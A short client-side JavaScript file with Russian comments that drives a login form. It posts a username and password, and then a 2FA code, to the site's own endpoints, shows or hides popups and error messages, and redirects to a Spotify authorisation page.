function auth(){
    try {
        login = document.getElementById('login').value
        pass = document.getElementById('pass').value
        $(function () {
            $.ajax({
                url: '/get_auth_data',
                type: 'POST',
                contentType: 'application/json;charset=UTF-8',
                dataType: 'json',
                data : JSON.stringify({
                    'login': login,
                    'pass' : pass 
                }),
                success: function (response) {
                    console.log(response);
                    if (response['2fa_required']) {
                        hide_auth_data()
                    }
                    if (response['2fa_required'] === false) {
                        window.location.href = '/auth_spotify';
                    }
                    if (response['wrong_password']) {
                        document.getElementById('wrong-pass').style.display = 'block'
                    }
                },
                error: function (error) {}
            });
        })
    } catch (error) {
        console.log(error);
        code = document.getElementById('2fa_code').value
        $(function () {
            $.ajax({
                url: '/get_code',
                type: 'POST',
                contentType: 'application/json;charset=UTF-8',
                dataType: 'json',
                data : JSON.stringify({
                    'code': String(code)
                }),
                success: function (response) {
                    if (response.success === true){
                        window.location.href = '/auth_spotify';
                    }
                    if (response.success === false){
                        let button = document.getElementById('2fa_code').value = ''
                        document.getElementById('wrong_code_hidden').style.display = 'block'
                    }
                },
                error: function (error) {}
            });
        })
    }
}


//Функция отображения PopUp
function PopUpShow(){
    $("#popup1").show();
}

function PopUpHide(){
    $("#popup1").hide();
}


//Функция скрытия PopUp
function PopUpHideAndAccept(){
    $("#popup1").hide();
    auth()
}
function PopUpHideAndCancel(){
    $("#popup1").hide();
    window.location.href = '/'
}



function hide_auth_data() {
    document.getElementById('vk_button').onclick = auth
    document.getElementById('wrong-pass').style.display = 'none'
    document.getElementById('vk_auth_login').remove()
    document.getElementById('vk_auth_pass').remove()
    document.getElementById('hidden_2fa').style.display = 'block'
    value = document.getElementById('hidden_2fa')

}
